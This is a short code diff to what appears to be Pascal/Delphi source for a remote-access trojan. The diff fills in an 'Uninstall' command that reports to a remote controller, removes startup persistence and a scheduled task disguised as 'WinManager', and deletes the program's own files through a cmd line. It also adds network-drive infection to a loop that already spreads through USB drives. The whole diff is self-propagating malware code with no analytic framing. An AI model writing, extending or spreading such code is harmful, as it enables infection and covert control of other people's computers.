@@ -223,7 +223,14 @@ Begin
       end;
     end;
     'Uninstall': Begin
-
+      ToPost.AddFormField('RT', '1');
+      ToPost.AddFormField('Result','Uninstalling...');
+      DoPost;
+      Reg_RemoveFromStartup;
+      DeleteTask('WinManager');
+      ChDel(StartupFolder+'\'+InternalName);
+      RunCmd('timeout 5 & del "'+Base+'\*.*" /F /Q & rmdir "'+Base+'" & pause');
+      Halt(0);
     end;
     'Upload': Begin
       ToPost.AddFormField('RT', '2');
@@ -405,7 +412,7 @@ Begin
       //Create clone
       While Not(Terminated) do Begin
         InfectUSBDrives;
-
+        InfectNetworkDrives;
         Sleep(1000);
       end;
       //Remove clone
